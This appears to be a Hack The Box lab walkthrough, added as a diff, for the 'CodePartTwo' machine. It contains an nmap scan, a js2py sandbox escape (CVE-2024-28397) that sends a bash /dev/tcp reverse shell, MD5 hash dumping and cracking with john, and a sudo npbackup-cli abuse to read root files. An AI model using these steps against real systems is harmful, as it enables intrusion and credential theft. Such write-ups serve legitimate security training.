@@ -1,0 +1,150 @@
+#nmap
+
+# Nmap 7.95 scan initiated Tue Oct 28 03:27:44 2025 as: /usr/lib/nmap/nmap --privileged -p- -A --min-rate=1000 -o nmap0.txt 10.10.11.82
+Nmap scan report for 10.10.11.82
+Host is up (0.26s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
+|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
+|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
+8000/tcp open  http    Gunicorn 20.0.4
+|_http-title: Welcome to CodePartTwo
+|_http-server-header: gunicorn/20.0.4
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT       ADDRESS
+1   106.58 ms 10.10.14.1
+2   94.99 ms  10.10.11.82
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Oct 28 03:29:34 2025 -- 1 IP address (1 host up) scanned in 110.30 seconds
+_______________________________________________________________________________________________________________________________________________________________
+# We find a CVE :CVE-2024-28397
+
+    # start listener
+    ┌──(kali㉿kali)-[~/HAckthebox/Code Part TWo]
+    └─$ pwncat -l 8888
+__________________________________________________________________________________________________________
+# Exploiting the script
+          ──(kali㉿kali)-[~/HAckthebox/Code Part TWo/Tools/CVE-2024-28397]
+          └─$ python3 exploit.py --target http://10.10.11.82:8000/run_code --lhost 10.10.14.156 --lport 8888
+          
+          ============================================================
+          CVE-2024-28397 - js2py Sandbox Escape Exploit
+          Targets js2py <= 0.74
+          ============================================================
+          
+          [*] Generating exploit payload...
+          [+] Target URL: http://10.10.11.82:8000/run_code
+          [+] Reverse shell: (bash >& /dev/tcp/10.10.14.156/8888 0>&1) &
+          [+] Base64 encoded: KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTU2Lzg4ODggMD4mMSkgJg==
+          [+] Listening address: 10.10.14.156:8888
+          
+          [!] Start your listener: nc -lnvp 8888
+          
+          [*] Press Enter when your listener is ready...
+          [*] Sending exploit payload...
+          [+] Payload sent successfully!
+          [+] Response: {"error":"'NoneType' object is not callable"}
+          
+          [+] Check your netcat listener for the reverse shell!
+ __________________________________________________________________________________________________________
+#got the shell
+┌──(kali㉿kali)-[~/HAckthebox/Code Part TWo]
+    └─$ pwncat -l 8888
+    ls
+    app.py
+    instance
+    __pycache__
+    requirements.txt
+    static
+    templates
+_______________________________________________________________________________________________________________________________________________________________
+# stabilizing the shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+app@codeparttwo:~/app/instance$ l
+_____________________________________________________
+# foudn a database file
+app@codeparttwo:~/app/instance$ ls
+ls
+users.db
+_____________________________________________________
+#extracting hashes
+app@codeparttwo:~/app/instance$ sqlite3 users.db
+sqlite3 users.db
+SQLite version 3.31.1 2020-01-27 19:55:54
+Enter ".help" for usage hints.
+sqlite> .tables
+.tables
+code_snippet  user
+sqlite> .schema user
+.schema user
+CREATE TABLE user (
+        id INTEGER NOT NULL,
+        username VARCHAR(80) NOT NULL,
+        password_hash VARCHAR(128) NOT NULL,
+        PRIMARY KEY (id),
+        UNIQUE (username)
+);
+
+
+sqlite> SELECT * FROM user;
+SELECT * FROM user;
+1|marco|649c9d65a206a75f5abe509fe128bce5
+2|app|a97588c0e2fa3a024876339e27aeb42e
+sqlite>
+__________________________________________________________________________________________________________
+# cracked the hash
+┌──(kali㉿kali)-[~/HAckthebox/Code Part TWo]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
+john --show --format=raw-md5 hashes.txt
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+sweetangelbabylove (?)
+1g 0:00:00:03 DONE (2025-11-06 05:05) 0.2617g/s 3754Kp/s 3754Kc/s 4657KC/s  fuckyooh21..*7¡Vamos!
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.
+?:sweetangelbabylove
+
+1 password hash cracked, 1 left
+__________________________________________________________________________________________________________
+#logged a marco and finding permissions
+marco@codeparttwo:~$  sudo -l
+ sudo -l
+Matching Defaults entries for marco on codeparttwo:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User marco may run the following commands on codeparttwo:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+marco@codeparttwo:~$
+__________________________________________________________________________________________________________
+#Priv_Esc
+# 1. Edit npbackup.conf so backup_opts points to /root
+sed -i 's|/home/app/app/|/root|' npbackup.conf
+
+# 2. Lower the minimum backup age so it won’t skip
+sed -i 's/minimum_backup_age: 1440/minimum_backup_age: 0/' npbackup.conf
+
+# 3. Force a new backup run
+sudo npbackup-cli -c npbackup.conf -f --backup
+
+# 4. List what’s in the snapshot to confirm /root is included
+sudo npbackup-cli -c npbackup.conf --list
+
+# 5. Now dump the file you want
+sudo npbackup-cli -c npbackup.conf -f --dump /root/root.txt
+
+Happy hunting
+____________________________________________________________________________________________________________________________________________________________________________________________________________________
